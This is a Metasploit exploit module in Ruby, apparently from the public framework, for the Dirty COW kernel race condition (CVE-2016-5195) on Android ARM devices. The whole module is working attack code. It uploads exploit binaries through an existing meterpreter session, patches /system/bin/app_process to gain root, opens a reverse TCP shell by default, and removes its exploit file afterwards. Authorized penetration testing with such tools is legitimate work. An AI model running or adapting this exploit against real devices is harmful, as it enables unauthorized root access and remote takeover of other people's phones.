##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Common
  include Msf::Exploit::EXE

  def initialize(info={})
    super( update_info( info, {
        'Name'          => "Android DirtyCow Exploit",
        'Description'   => %q{
          A race condition was found in the way the Linux kernel's memory
          subsystem handled the copy-on-write (COW) breakage of private
          read-only memory mappings. An unprivileged local user could use
          this flaw to gain write access to otherwise read-only memory mappings
          and thus increase their privileges on the system.
          The bug has existed since around Linux Kernel 2.6.22 (released in 2007).
        },
        'License'       => MSF_LICENSE,
        'Author'        => [
          'Phil Oester',  # discovery
          'scumjr',       # dirtycow-mem.c
          'timwr',        # metasploit module
        ],
        'References'    =>
        [
          [ 'CVE', '2016-5195' ],
          [ 'URL', 'http://dirtycow.ninja/' ],
          [ 'URL', 'https://gist.github.com/scumjr/17d91f20f73157c722ba2aea702985d2' ],
        ],
        'DisclosureDate' => "Oct 20 2016",
        'SessionTypes'   => [ 'meterpreter' ],
        "Platform"       => [ "android", "linux" ],
        'Payload'        => { 'Space'    => 512 },
        "Arch"           => ARCH_ARMLE,
        'DefaultOptions' =>
        {
          'PAYLOAD'      => 'linux/armle/mettle/reverse_tcp',
          'WfsDelay'     => 60,
        },
        'DefaultTarget' => 0,
        'Targets'       => [ ['Automatic', { }]],
    }))
  end

  def exploit
    arch = "armeabi-v7a"
    local_file = File.join( Msf::Config.data_directory, "exploits", "CVE-2016-5195", arch, "dirtycow" )
    app_process = File.join( Msf::Config.data_directory, "exploits", "CVE-2016-5195", arch, "run-as" )
    exploit_data = File.read(local_file, {:mode => 'rb'})
    app_process_data = File.read(app_process, {:mode => 'rb'})

    # Substitute the exploit shellcode with our own
    payload_space = 1024
    space = payload_space
    payload_encoded = "\x01\xa3\x18\x47"
    payload_encoded += payload.raw
    #payload_encoded += "\x05\x00\xa0\xe3\x00\x00\x00\x40\x02\x10\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef"
    print_status "applying shellcode #{payload_encoded[0,10].unpack('H*')} #{payload_encoded.length} into #{space}"
    #payload_data = "\x01\xa3\x18\x47" + payload.raw
    #app_process_data.sub!("\x46\x00" * (payload_encoded.length / 2), payload_encoded)

    workingdir = session.fs.dir.getwd
    exploit_file = "#{workingdir}/#{Rex::Text::rand_text_alpha_lower(5)}"
    app_process_file = "#{workingdir}/#{Rex::Text::rand_text_alpha_lower(5)}"
    write_file(exploit_file, exploit_data)
    write_file(app_process_file, app_process_data)
    cmd_exec("chmod 700 #{exploit_file}")
    cmd_exec("chmod 700 #{app_process_file}")

    #output = cmd_exec("#{exploit_file} #{app_process_file} /system/bin/app_process")
    output = cmd_exec("#{app_process_file} /system/bin/app_process")
    print_status output
    session.fs.file.rm(exploit_file)
  end

end

